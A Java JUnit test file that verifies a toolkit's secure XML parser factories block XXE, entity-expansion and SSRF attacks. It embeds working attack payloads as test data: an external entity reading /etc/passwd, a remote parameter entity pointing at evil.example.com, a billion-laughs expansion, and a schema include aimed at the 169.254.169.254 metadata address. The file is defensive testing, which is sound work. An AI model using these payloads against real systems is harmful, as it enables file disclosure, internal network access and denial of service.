package org.fxt.freexmltoolkit.security;

import static org.junit.jupiter.api.Assertions.*;

import java.io.IOException;
import java.io.StringReader;
import java.nio.file.Files;
import java.nio.file.Path;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;

import org.fxt.freexmltoolkit.util.SecureXmlFactory;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.w3c.dom.Document;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

/**
 * Security tests for SecureXmlFactory.
 * These tests verify that XXE (XML External Entity) attacks are properly blocked.
 */
@DisplayName("SecureXmlFactory Security Tests")
class SecureXmlFactoryTest {

    @TempDir
    Path tempDir;

    // =========================================================================
    // XXE Attack Payloads
    // =========================================================================

    private static final String XXE_FILE_READ_PAYLOAD = """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root>&xxe;</root>
            """;

    private static final String XXE_PARAMETER_ENTITY_PAYLOAD = """
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY % xxe SYSTEM "http://evil.example.com/xxe.dtd">
              %xxe;
            ]>
            <root>test</root>
            """;

    private static final String XXE_BILLION_LAUGHS_PAYLOAD = """
            <?xml version="1.0"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
              <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
            ]>
            <root>&lol4;</root>
            """;

    private static final String SAFE_XML = """
            <?xml version="1.0"?>
            <root>
                <element>Safe content</element>
            </root>
            """;

    // =========================================================================
    // DocumentBuilderFactory Tests
    // =========================================================================

    @Test
    @DisplayName("SecureDocumentBuilderFactory blocks external file entity")
    void secureDocumentBuilderFactory_blocksExternalFileEntity() throws ParserConfigurationException {
        // Create a secret file to attempt to read
        Path secretFile = tempDir.resolve("secret.txt");
        try {
            Files.writeString(secretFile, "SECRET_DATA_12345");
        } catch (IOException e) {
            fail("Could not create test file");
        }

        String xxePayload = String.format("""
                <?xml version="1.0"?>
                <!DOCTYPE foo [
                  <!ENTITY xxe SYSTEM "file://%s">
                ]>
                <root>&xxe;</root>
                """, secretFile.toAbsolutePath());

        DocumentBuilderFactory factory = SecureXmlFactory.createSecureDocumentBuilderFactory(true);
        DocumentBuilder builder = factory.newDocumentBuilder();

        // The parser should either throw an exception or not expand the entity
        try {
            Document doc = builder.parse(new InputSource(new StringReader(xxePayload)));
            String content = doc.getDocumentElement().getTextContent();
            // If we get here without exception, the content should NOT contain the secret
            assertFalse(content.contains("SECRET_DATA_12345"),
                    "XXE attack succeeded - file content was exposed: " + content);
            // Entity was silently ignored - that's secure behavior
            assertTrue(true, "XXE entity was silently ignored (secure)");
        } catch (Exception e) {
            // Exception is expected - attack blocked
            assertTrue(true, "XXE attack was blocked with exception: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("SecureDocumentBuilderFactory blocks external parameter entity")
    void secureDocumentBuilderFactory_blocksExternalParameterEntity() throws ParserConfigurationException {
        DocumentBuilderFactory factory = SecureXmlFactory.createSecureDocumentBuilderFactory(true);
        DocumentBuilder builder = factory.newDocumentBuilder();

        // This should throw an exception or silently ignore the external entity
        try {
            builder.parse(new InputSource(new StringReader(XXE_PARAMETER_ENTITY_PAYLOAD)));
            // If parsing succeeds, external entity was ignored (secure)
            assertTrue(true, "External parameter entity was silently ignored (secure)");
        } catch (Exception e) {
            // Exception is expected - attack blocked
            assertTrue(true, "External parameter entity was blocked with exception: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("SecureDocumentBuilderFactory blocks billion laughs attack")
    void secureDocumentBuilderFactory_blocksBillionLaughsAttack() throws ParserConfigurationException {
        DocumentBuilderFactory factory = SecureXmlFactory.createSecureDocumentBuilderFactory(true);
        DocumentBuilder builder = factory.newDocumentBuilder();

        // Billion laughs should either throw or not expand entities dangerously
        // With our test payload (lol4), normal expansion would be about 10000 "lol"s
        // But we've disabled entity expansion, so either:
        // - An exception is thrown (best case)
        // - Entities are not expanded (content is small)
        // - Entities are only partially expanded (content is reasonable)
        try {
            Document doc = builder.parse(new InputSource(new StringReader(XXE_BILLION_LAUGHS_PAYLOAD)));
            String content = doc.getDocumentElement().getTextContent();
            // If parsing succeeds, content should be reasonable (not exponentially large)
            // A full exponential expansion would result in millions of characters
            assertTrue(content.length() < 100000,
                    "Billion laughs attack may have succeeded - content length: " + content.length());
        } catch (Exception e) {
            // Exception is expected - attack blocked
            assertTrue(true, "Billion laughs attack was blocked with exception: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("SecureDocumentBuilderFactory allows safe XML")
    void secureDocumentBuilderFactory_allowsSafeXml() throws Exception {
        DocumentBuilderFactory factory = SecureXmlFactory.createSecureDocumentBuilderFactory(true);
        DocumentBuilder builder = factory.newDocumentBuilder();

        Document doc = builder.parse(new InputSource(new StringReader(SAFE_XML)));

        assertNotNull(doc);
        assertEquals("root", doc.getDocumentElement().getTagName());
        assertEquals("Safe content", doc.getElementsByTagName("element").item(0).getTextContent());
    }

    @Test
    @DisplayName("SecureDocumentBuilderFactory respects namespace awareness setting")
    void secureDocumentBuilderFactory_respectsNamespaceAwareness() throws Exception {
        DocumentBuilderFactory namespaceAware = SecureXmlFactory.createSecureDocumentBuilderFactory(true);
        DocumentBuilderFactory notNamespaceAware = SecureXmlFactory.createSecureDocumentBuilderFactory(false);

        assertTrue(namespaceAware.isNamespaceAware(), "Factory should be namespace aware");
        assertFalse(notNamespaceAware.isNamespaceAware(), "Factory should not be namespace aware");
    }

    // =========================================================================
    // SAXParser Tests
    // =========================================================================

    @Test
    @DisplayName("SecureSAXParser blocks external entity")
    void secureSAXParser_blocksExternalEntity() throws Exception {
        SAXParser parser = SecureXmlFactory.createSecureSAXParser();

        StringBuilder contentBuilder = new StringBuilder();
        try {
            parser.parse(new InputSource(new StringReader(XXE_FILE_READ_PAYLOAD)),
                    new org.xml.sax.helpers.DefaultHandler() {
                        @Override
                        public void characters(char[] ch, int start, int length) {
                            contentBuilder.append(ch, start, length);
                        }
                    });
            // If parsing succeeds, verify content doesn't contain file system data
            String content = contentBuilder.toString();
            assertFalse(content.contains("root:"),
                    "SAX parser should not resolve external entity - content: " + content);
            assertTrue(true, "External entity was silently ignored (secure)");
        } catch (SAXException e) {
            // Exception is expected - attack blocked
            assertTrue(true, "SAX parser blocked external entity with exception: " + e.getMessage());
        }
    }

    @Test
    @DisplayName("SecureSAXParser allows safe XML")
    void secureSAXParser_allowsSafeXml() throws Exception {
        SAXParser parser = SecureXmlFactory.createSecureSAXParser();

        // Should not throw
        parser.parse(new InputSource(new StringReader(SAFE_XML)),
                new org.xml.sax.helpers.DefaultHandler());
    }

    // =========================================================================
    // XMLInputFactory (StAX) Tests
    // =========================================================================

    @Test
    @DisplayName("SecureXMLInputFactory blocks external entity")
    void secureXMLInputFactory_blocksExternalEntity() throws Exception {
        XMLInputFactory factory = SecureXmlFactory.createSecureXMLInputFactory();

        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(XXE_FILE_READ_PAYLOAD));

        // Process the stream - external entities should not be resolved
        StringBuilder content = new StringBuilder();
        while (reader.hasNext()) {
            int event = reader.next();
            if (event == XMLStreamReader.CHARACTERS) {
                content.append(reader.getText());
            }
        }
        reader.close();

        // If we got here, entities were not resolved (good) or silently ignored
        assertFalse(content.toString().contains("root:"),
                "StAX parser may have resolved external entity");
    }

    @Test
    @DisplayName("SecureXMLInputFactory allows safe XML")
    void secureXMLInputFactory_allowsSafeXml() throws Exception {
        XMLInputFactory factory = SecureXmlFactory.createSecureXMLInputFactory();

        XMLStreamReader reader = factory.createXMLStreamReader(new StringReader(SAFE_XML));

        boolean foundElement = false;
        while (reader.hasNext()) {
            int event = reader.next();
            if (event == XMLStreamReader.START_ELEMENT && "element".equals(reader.getLocalName())) {
                foundElement = true;
            }
        }
        reader.close();

        assertTrue(foundElement, "Should parse safe XML correctly");
    }

    // =========================================================================
    // TransformerFactory Tests
    // =========================================================================

    @Test
    @DisplayName("SecureTransformerFactory is created successfully")
    void secureTransformerFactory_createsSuccessfully() {
        var factory = SecureXmlFactory.createSecureTransformerFactory();
        assertNotNull(factory, "TransformerFactory should be created");
    }

    // =========================================================================
    // SchemaFactory Tests (XXE / SSRF hardening)
    // =========================================================================

    private static final String VALID_SCHEMA = """
            <?xml version="1.0"?>
            <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
                <xs:element name="root" type="xs:string"/>
            </xs:schema>
            """;

    @Test
    @DisplayName("SecureSchemaFactory compiles a valid self-contained schema")
    void secureSchemaFactory_compilesValidSchema() throws Exception {
        var factory = SecureXmlFactory.createSecureSchemaFactory(
                javax.xml.XMLConstants.W3C_XML_SCHEMA_NS_URI);
        var schema = factory.newSchema(new javax.xml.transform.stream.StreamSource(
                new StringReader(VALID_SCHEMA)));
        assertNotNull(schema, "A valid self-contained schema should compile");
    }

    @Test
    @DisplayName("SecureSchemaFactory (local-only) blocks an http xs:include (SSRF protection)")
    void secureSchemaFactory_blocksRemoteInclude() {
        // Local-only default must reject schema references over network protocols, preventing
        // a malicious schema from triggering SSRF / internal-resource access. An xs:include is
        // a mandatory reference, so a blocked network fetch surfaces as a fatal error (proving
        // the processor never reached out over the network).
        String remoteIncludeSchema = """
                <?xml version="1.0"?>
                <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
                    <xs:include schemaLocation="http://169.254.169.254/evil.xsd"/>
                    <xs:element name="root" type="xs:string"/>
                </xs:schema>
                """;

        var factory = SecureXmlFactory.createSecureSchemaFactory(
                javax.xml.XMLConstants.W3C_XML_SCHEMA_NS_URI);

        Exception ex = assertThrows(Exception.class, () ->
                        factory.newSchema(new javax.xml.transform.stream.StreamSource(
                                new StringReader(remoteIncludeSchema))),
                "An http xs:include must be blocked");
        // The local-only resolver throws SecurityException; depending on the parser it may surface
        // directly or wrapped. Verify the block reason appears somewhere in the exception chain.
        String chain = throwableChainText(ex);
        assertTrue(chain.toLowerCase().contains("blocked remote schema")
                        || chain.toLowerCase().contains("access"),
                "Failure should be due to the remote-schema block, was: " + chain);
    }

    /** Concatenates the messages of an exception and all its causes for assertion purposes. */
    private static String throwableChainText(Throwable t) {
        StringBuilder sb = new StringBuilder();
        for (Throwable c = t; c != null && c != c.getCause(); c = c.getCause()) {
            if (c.getMessage() != null) {
                sb.append(c.getMessage()).append(" | ");
            }
        }
        return sb.toString();
    }

    @Test
    @DisplayName("SecureSchemaFactory (local-only) still allows a local xs:import")
    void secureSchemaFactory_allowsLocalImport() throws Exception {
        // Legitimate multi-file schemas using local relative imports must keep working.
        Path typesXsd = tempDir.resolve("types.xsd");
        Files.writeString(typesXsd, """
                <?xml version="1.0"?>
                <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
                           targetNamespace="http://example.com/types">
                    <xs:simpleType name="MyString">
                        <xs:restriction base="xs:string"/>
                    </xs:simpleType>
                </xs:schema>
                """);

        Path mainXsd = tempDir.resolve("main.xsd");
        Files.writeString(mainXsd, """
                <?xml version="1.0"?>
                <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"
                           xmlns:t="http://example.com/types">
                    <xs:import namespace="http://example.com/types" schemaLocation="types.xsd"/>
                    <xs:element name="root" type="t:MyString"/>
                </xs:schema>
                """);

        var factory = SecureXmlFactory.createSecureSchemaFactory(
                javax.xml.XMLConstants.W3C_XML_SCHEMA_NS_URI);
        var schema = factory.newSchema(mainXsd.toFile());
        assertNotNull(schema, "A schema with a local relative import should still compile");
    }
}
